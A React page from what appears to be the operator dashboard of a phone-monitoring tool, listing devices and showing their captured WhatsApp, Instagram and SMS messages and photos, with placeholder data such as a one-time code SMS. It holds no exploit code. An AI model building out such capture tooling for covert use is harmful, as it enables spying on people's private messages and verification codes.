'use client';

import { useState, useEffect } from 'react';

interface Device {
  id: string;
  deviceId: string;
  deviceName: string;
  model: string;
  os: string;
  osVersion?: string;
  lastActive: Date;
  userId: string;
  totalMessages?: number;
  whatsapp?: number;
  instagram?: number;
  sms?: number;
  photos?: number;
  storage?: string;
}

interface Message {
  id: string;
  appName: string;
  sender: string;
  text: string;
  messageType: 'sent' | 'received';
  timestamp: number;
}

interface SMS {
  id: string;
  address: string;
  body: string;
  type: 1 | 2;
  date: number;
}

export default function DevicesPage() {
  const [selectedDevice, setSelectedDevice] = useState<string | null>(null);
  const [selectedCategory, setSelectedCategory] = useState('all');
  const [devices, setDevices] = useState<Device[]>([]);
  const [_deviceMessages, setDeviceMessages] = useState<Message[]>([]);
  const [_deviceSMS, setDeviceSMS] = useState<SMS[]>([]);
  const [loading, setLoading] = useState(true);

  // Fetch all devices on mount
  useEffect(() => {
    fetchDevices();
  }, []);

  // Fetch device details when selected
  useEffect(() => {
    if (selectedDevice) {
      fetchDeviceDetails(selectedDevice);
    }
  }, [selectedDevice]);

  async function fetchDevices() {
    try {
      const response = await fetch('/api/devices');
      const data = await response.json();

      if (data.success) {
        setDevices(data.devices);
      }
    } catch (error) {
      console.error('Error fetching devices:', error);
    } finally {
      setLoading(false);
    }
  }

  async function fetchDeviceDetails(deviceId: string) {
    try {
      const response = await fetch(`/api/devices/${deviceId}`);
      const data = await response.json();

      if (data.success) {
        setDeviceMessages(data.messages || []);
        setDeviceSMS(data.sms || []);
      }
    } catch (error) {
      console.error('Error fetching device details:', error);
    }
  }

  function formatLastActive(date: Date | string): string {
    const now = new Date();
    const lastActive = new Date(date);
    const diffMs = now.getTime() - lastActive.getTime();
    const diffMins = Math.floor(diffMs / 60000);
    const diffHours = Math.floor(diffMs / 3600000);
    const diffDays = Math.floor(diffMs / 86400000);

    if (diffMins < 1) return 'Just now';
    if (diffMins < 60) return `${diffMins} min ago`;
    if (diffHours < 24) return `${diffHours} hour${diffHours > 1 ? 's' : ''} ago`;
    return `${diffDays} day${diffDays > 1 ? 's' : ''} ago`;
  }

  const deviceData = {
    device1: {
      whatsapp: [
        { sender: 'John Doe', message: 'Hey, how are you?', time: '14:30', type: 'received' },
        { sender: 'Me', message: 'I am good, thanks!', time: '14:28', type: 'sent' },
      ],
      instagram: [
        { sender: 'Jane Smith', message: 'Love this!', time: '13:45', type: 'received' },
      ],
      sms: [
        { sender: '+1234567890', message: 'Your code is 123456', time: '12:30', type: 'received' },
      ],
      photos: [
        { name: 'IMG_001.jpg', size: '2.4 MB', date: '2024-01-15' },
        { name: 'IMG_002.jpg', size: '3.1 MB', date: '2024-01-14' },
      ],
    },
    device2: {
      whatsapp: [
        { sender: 'Bob Wilson', message: 'See you tomorrow!', time: '16:20', type: 'received' },
      ],
      instagram: [
        { sender: 'Me', message: 'Thanks for sharing!', time: '15:10', type: 'sent' },
      ],
      sms: [
        { sender: 'Mom', message: 'Call me when you can', time: '14:05', type: 'received' },
      ],
      photos: [
        { name: 'photo_001.jpg', size: '1.8 MB', date: '2024-01-15' },
      ],
    },
    device3: {
      whatsapp: [
        { sender: 'Alice Johnson', message: 'Good morning!', time: '09:30', type: 'received' },
      ],
      instagram: [
        { sender: 'Mike Brown', message: 'Nice pic!', time: '18:45', type: 'received' },
      ],
      sms: [
        { sender: 'Bank', message: 'Your balance is $1,234', time: '10:15', type: 'received' },
      ],
      photos: [
        { name: 'sunset.jpg', size: '2.9 MB', date: '2024-01-13' },
      ],
    },
  };

  const getSelectedDeviceData = () => {
    if (!selectedDevice) return null;
    return devices.find(d => d.id === selectedDevice);
  };

  const selectedDeviceInfo = getSelectedDeviceData();

  return (
    <div className="space-y-6">
      {/* Header */}
      <div>
        <h2 className="text-3xl font-bold text-white mb-2">Devices</h2>
        <p className="text-gray-400">Monitor all connected devices and their data</p>
      </div>

      {loading ? (
        /* Loading State */
        <div className="glass-card p-12 text-center">
          <div className="inline-block w-16 h-16 border-4 border-blue-400 border-t-transparent rounded-full animate-spin mb-4"></div>
          <p className="text-gray-400">Loading devices...</p>
        </div>
      ) : devices.length === 0 ? (
        /* No Devices State */
        <div className="glass-card p-12 text-center">
          <svg className="w-20 h-20 text-gray-600 mx-auto mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
          </svg>
          <h3 className="text-xl font-bold text-white mb-2">No Devices Found</h3>
          <p className="text-gray-400">No devices have sent data yet. Make sure your mobile app is capturing messages.</p>
        </div>
      ) : !selectedDevice ? (
        /* Device Selection Grid */
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
          {devices.map((device) => (
            <button
              key={device.id}
              onClick={() => setSelectedDevice(device.id)}
              className="glass-card p-6 text-left hover:scale-[1.02] transition-all duration-300 group"
            >
              {/* Device Header */}
              <div className="flex items-start justify-between mb-6">
                <div className="flex items-center space-x-4">
                  <div className={`w-16 h-16 rounded-xl flex items-center justify-center ${
                    device.model.includes('iPhone') ? 'bg-blue-500/20' : 'bg-green-500/20'
                  }`}>
                    <svg className={`w-8 h-8 ${device.model.includes('iPhone') ? 'text-blue-400' : 'text-green-400'}`} fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
                    </svg>
                  </div>
                  <div>
                    <h3 className="text-xl font-bold text-white group-hover:text-blue-400 transition-colors">{device.deviceName}</h3>
                    <p className="text-gray-400 text-sm">{device.os} {device.osVersion || ''}</p>
                  </div>
                </div>
                <div className="w-3 h-3 rounded-full bg-green-500 glow"></div>
              </div>

              {/* Stats Grid */}
              <div className="grid grid-cols-2 gap-4 mb-6">
                <div className="glass-input p-3 rounded-lg">
                  <p className="text-gray-400 text-xs mb-1">Messages</p>
                  <p className="text-white text-lg font-bold">{device.totalMessages || 0}</p>
                </div>
                <div className="glass-input p-3 rounded-lg">
                  <p className="text-gray-400 text-xs mb-1">Photos</p>
                  <p className="text-white text-lg font-bold">{device.photos || 0}</p>
                </div>
                <div className="glass-input p-3 rounded-lg">
                  <p className="text-gray-400 text-xs mb-1">Storage</p>
                  <p className="text-white text-lg font-bold">{device.storage || '0 MB'}</p>
                </div>
                <div className="glass-input p-3 rounded-lg">
                  <p className="text-gray-400 text-xs mb-1">Last Active</p>
                  <p className="text-white text-sm font-bold">{formatLastActive(device.lastActive)}</p>
                </div>
              </div>

              {/* Category Breakdown */}
              <div className="space-y-2">
                <div className="flex items-center justify-between text-sm">
                  <div className="flex items-center space-x-2">
                    <div className="w-2 h-2 rounded-full bg-green-400"></div>
                    <span className="text-gray-400">WhatsApp</span>
                  </div>
                  <span className="text-white font-semibold">{device.whatsapp || 0}</span>
                </div>
                <div className="flex items-center justify-between text-sm">
                  <div className="flex items-center space-x-2">
                    <div className="w-2 h-2 rounded-full bg-pink-400"></div>
                    <span className="text-gray-400">Instagram</span>
                  </div>
                  <span className="text-white font-semibold">{device.instagram || 0}</span>
                </div>
                <div className="flex items-center justify-between text-sm">
                  <div className="flex items-center space-x-2">
                    <div className="w-2 h-2 rounded-full bg-purple-400"></div>
                    <span className="text-gray-400">SMS</span>
                  </div>
                  <span className="text-white font-semibold">{device.sms || 0}</span>
                </div>
              </div>

              {/* View Details Button */}
              <div className="mt-6 flex items-center justify-between pt-4 border-t border-white/10">
                <span className="text-gray-400 text-sm">Click to view details</span>
                <svg className="w-5 h-5 text-blue-400 group-hover:translate-x-1 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                </svg>
              </div>
            </button>
          ))}
        </div>
      ) : (
        /* Device Detail View */
        <div className="space-y-6">
          {/* Back Button & Device Header */}
          <div className="glass-card p-6">
            <button
              onClick={() => setSelectedDevice(null)}
              className="flex items-center space-x-2 text-blue-400 hover:text-blue-300 transition-colors mb-6"
            >
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
              </svg>
              <span>Back to Devices</span>
            </button>

            <div className="flex items-center justify-between">
              <div className="flex items-center space-x-6">
                <div className={`w-20 h-20 rounded-2xl flex items-center justify-center ${
                  selectedDeviceInfo?.model.includes('iPhone') ? 'bg-blue-500/20' : 'bg-green-500/20'
                }`}>
                  <svg className={`w-10 h-10 ${selectedDeviceInfo?.model.includes('iPhone') ? 'text-blue-400' : 'text-green-400'}`} fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
                  </svg>
                </div>
                <div>
                  <h3 className="text-3xl font-bold text-white mb-1">{selectedDeviceInfo?.deviceName}</h3>
                  <p className="text-gray-400">{selectedDeviceInfo?.model} • {selectedDeviceInfo?.os}</p>
                </div>
              </div>
              <div className="flex items-center space-x-3">
                <div className="w-3 h-3 rounded-full bg-green-500 glow"></div>
                <span className="text-gray-400">Active {selectedDeviceInfo?.lastActive ? formatLastActive(selectedDeviceInfo.lastActive) : ''}</span>
              </div>
            </div>
          </div>

          {/* Stats Overview */}
          <div className="grid grid-cols-1 md:grid-cols-4 gap-6">
            <div className="glass-card p-6">
              <div className="flex items-center space-x-4">
                <div className="w-12 h-12 rounded-lg bg-blue-500/20 flex items-center justify-center">
                  <svg className="w-6 h-6 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z" />
                  </svg>
                </div>
                <div>
                  <p className="text-gray-400 text-sm">Total Messages</p>
                  <p className="text-2xl font-bold text-white">{selectedDeviceInfo?.totalMessages}</p>
                </div>
              </div>
            </div>
            <div className="glass-card p-6">
              <div className="flex items-center space-x-4">
                <div className="w-12 h-12 rounded-lg bg-pink-500/20 flex items-center justify-center">
                  <svg className="w-6 h-6 text-pink-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z" />
                  </svg>
                </div>
                <div>
                  <p className="text-gray-400 text-sm">Photos</p>
                  <p className="text-2xl font-bold text-white">{selectedDeviceInfo?.photos}</p>
                </div>
              </div>
            </div>
            <div className="glass-card p-6">
              <div className="flex items-center space-x-4">
                <div className="w-12 h-12 rounded-lg bg-purple-500/20 flex items-center justify-center">
                  <svg className="w-6 h-6 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 7v10c0 2.21 3.582 4 8 4s8-1.79 8-4V7M4 7c0 2.21 3.582 4 8 4s8-1.79 8-4M4 7c0-2.21 3.582-4 8-4s8 1.79 8 4m0 5c0 2.21-3.582 4-8 4s-8-1.79-8-4" />
                  </svg>
                </div>
                <div>
                  <p className="text-gray-400 text-sm">Storage Used</p>
                  <p className="text-2xl font-bold text-white">{selectedDeviceInfo?.storage}</p>
                </div>
              </div>
            </div>
            <div className="glass-card p-6">
              <div className="flex items-center space-x-4">
                <div className="w-12 h-12 rounded-lg bg-green-500/20 flex items-center justify-center">
                  <svg className="w-6 h-6 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                </div>
                <div>
                  <p className="text-gray-400 text-sm">Status</p>
                  <p className="text-xl font-bold text-green-400">Online</p>
                </div>
              </div>
            </div>
          </div>

          {/* Category Tabs */}
          <div className="glass-card p-6">
            <div className="flex space-x-2 border-b border-white/10 pb-4">
              {['all', 'whatsapp', 'instagram', 'sms', 'photos'].map((cat) => (
                <button
                  key={cat}
                  onClick={() => setSelectedCategory(cat)}
                  className={`px-6 py-3 rounded-lg text-sm font-semibold transition-all duration-200 ${
                    selectedCategory === cat
                      ? 'glass-button text-white'
                      : 'text-gray-400 hover:text-white hover:glass-input'
                  }`}
                >
                  {cat.charAt(0).toUpperCase() + cat.slice(1)}
                </button>
              ))}
            </div>
          </div>

          {/* Category Content */}
          {(selectedCategory === 'all' || selectedCategory === 'whatsapp') && (
            <div className="glass-card p-6">
              <h4 className="text-xl font-bold text-white mb-4 flex items-center space-x-3">
                <div className="w-10 h-10 rounded-lg bg-green-500/20 flex items-center justify-center">
                  <span className="text-green-400 font-bold">W</span>
                </div>
                <span>WhatsApp Messages ({selectedDeviceInfo?.whatsapp})</span>
              </h4>
              <div className="space-y-3">
                {deviceData[selectedDevice as keyof typeof deviceData]?.whatsapp.map((msg, idx) => (
                  <div key={idx} className="glass-input p-4 rounded-lg">
                    <div className="flex items-start justify-between">
                      <div>
                        <h5 className="text-white font-semibold mb-1">{msg.sender}</h5>
                        <p className="text-gray-300">{msg.message}</p>
                      </div>
                      <div className="text-right">
                        <p className="text-gray-400 text-sm mb-2">{msg.time}</p>
                        <span className={`text-xs px-2 py-1 rounded-full ${
                          msg.type === 'sent' ? 'bg-blue-500/20 text-blue-400' : 'bg-green-500/20 text-green-400'
                        }`}>
                          {msg.type}
                        </span>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {(selectedCategory === 'all' || selectedCategory === 'instagram') && (
            <div className="glass-card p-6">
              <h4 className="text-xl font-bold text-white mb-4 flex items-center space-x-3">
                <div className="w-10 h-10 rounded-lg bg-pink-500/20 flex items-center justify-center">
                  <span className="text-pink-400 font-bold">I</span>
                </div>
                <span>Instagram Messages ({selectedDeviceInfo?.instagram})</span>
              </h4>
              <div className="space-y-3">
                {deviceData[selectedDevice as keyof typeof deviceData]?.instagram.map((msg, idx) => (
                  <div key={idx} className="glass-input p-4 rounded-lg">
                    <div className="flex items-start justify-between">
                      <div>
                        <h5 className="text-white font-semibold mb-1">{msg.sender}</h5>
                        <p className="text-gray-300">{msg.message}</p>
                      </div>
                      <div className="text-right">
                        <p className="text-gray-400 text-sm mb-2">{msg.time}</p>
                        <span className={`text-xs px-2 py-1 rounded-full ${
                          msg.type === 'sent' ? 'bg-blue-500/20 text-blue-400' : 'bg-green-500/20 text-green-400'
                        }`}>
                          {msg.type}
                        </span>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {(selectedCategory === 'all' || selectedCategory === 'sms') && (
            <div className="glass-card p-6">
              <h4 className="text-xl font-bold text-white mb-4 flex items-center space-x-3">
                <div className="w-10 h-10 rounded-lg bg-purple-500/20 flex items-center justify-center">
                  <span className="text-purple-400 font-bold">S</span>
                </div>
                <span>SMS Messages ({selectedDeviceInfo?.sms})</span>
              </h4>
              <div className="space-y-3">
                {deviceData[selectedDevice as keyof typeof deviceData]?.sms.map((msg, idx) => (
                  <div key={idx} className="glass-input p-4 rounded-lg">
                    <div className="flex items-start justify-between">
                      <div>
                        <h5 className="text-white font-semibold mb-1">{msg.sender}</h5>
                        <p className="text-gray-300">{msg.message}</p>
                      </div>
                      <div className="text-right">
                        <p className="text-gray-400 text-sm mb-2">{msg.time}</p>
                        <span className={`text-xs px-2 py-1 rounded-full ${
                          msg.type === 'sent' ? 'bg-blue-500/20 text-blue-400' : 'bg-green-500/20 text-green-400'
                        }`}>
                          {msg.type}
                        </span>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {(selectedCategory === 'all' || selectedCategory === 'photos') && (
            <div className="glass-card p-6">
              <h4 className="text-xl font-bold text-white mb-4 flex items-center space-x-3">
                <div className="w-10 h-10 rounded-lg bg-pink-500/20 flex items-center justify-center">
                  <svg className="w-6 h-6 text-pink-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z" />
                  </svg>
                </div>
                <span>Photos ({selectedDeviceInfo?.photos})</span>
              </h4>
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                {deviceData[selectedDevice as keyof typeof deviceData]?.photos.map((photo, idx) => (
                  <div key={idx} className="glass-input p-4 rounded-lg">
                    <div className="aspect-video bg-gradient-to-br from-blue-500/20 to-pink-500/20 rounded-lg mb-3 flex items-center justify-center">
                      <svg className="w-12 h-12 text-white/50" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z" />
                      </svg>
                    </div>
                    <h5 className="text-white font-semibold mb-1">{photo.name}</h5>
                    <div className="flex items-center justify-between text-sm">
                      <span className="text-gray-400">{photo.size}</span>
                      <span className="text-gray-500">{photo.date}</span>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      )}
    </div>
  );
}
